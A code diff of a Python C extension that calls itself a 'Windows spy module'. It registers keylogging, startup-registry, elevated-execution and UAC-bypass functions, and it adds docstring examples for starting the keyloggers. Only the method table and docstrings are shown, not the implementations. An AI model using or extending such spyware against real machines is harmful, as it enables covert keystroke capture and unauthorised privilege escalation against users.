@@ -52,13 +52,13 @@ static PyMethodDef NeakyMethods[] = {
     {"delete_startup_reg", neaky_delete_startup_reg, METH_VARARGS,
      delete_startup_reg_doc},
     {"keylog_stdout", neaky_keylog_stdout, METH_NOARGS,
-     "Start keylogging and print to stdout."},
+     "Start keylogging and print to stdout.\nexample: ``import neaky; neaky.keylog_stdout(); neaky.message_loop()``"},
     {"keylog_to_file", neaky_keylog_to_file, METH_VARARGS,
      keylog_to_file_doc},
     {"keylog_stop", neaky_keylog_stop, METH_NOARGS,
-     "Stop keylogging to file."},
+     "Stop rawinput keylogging."},
     {"hook_keylog_stdout", neaky_hook_keylog_stdout, METH_NOARGS,
-     "Start keylogging and print to stdout."},
+     "Start keylogging and print to stdout.\nexample: ``import neaky; neaky.hook_keylog_stdout(); neaky.message_loop()``"},
     {"hook_keylog_stop", neaky_hook_keylog_stop, METH_NOARGS,
      "Stop keylogging to file."},
     {"message_loop", neaky_message_loop, METH_NOARGS,
@@ -70,13 +70,14 @@ static PyMethodDef NeakyMethods[] = {
     {"elevate_execute", neaky_elevate_execute, METH_VARARGS,
      elevate_execute_doc},
     {"bypass_uac_exec", neaky_bypass_uac_exec, METH_VARARGS,
-     elevate_execute_doc},
+     bypass_uac_exec_doc},
     {NULL, NULL, 0, NULL} /* Sentinel */
 };
 
 PyDoc_STRVAR(
     module_doc,
     "Windows spy module.\n"
+    "for more examples, visit https://github.com/am009/pyneaky/tree/main/test\n"
     "Keylogging requires message loop.");
 
 static struct PyModuleDef neakymodule = {
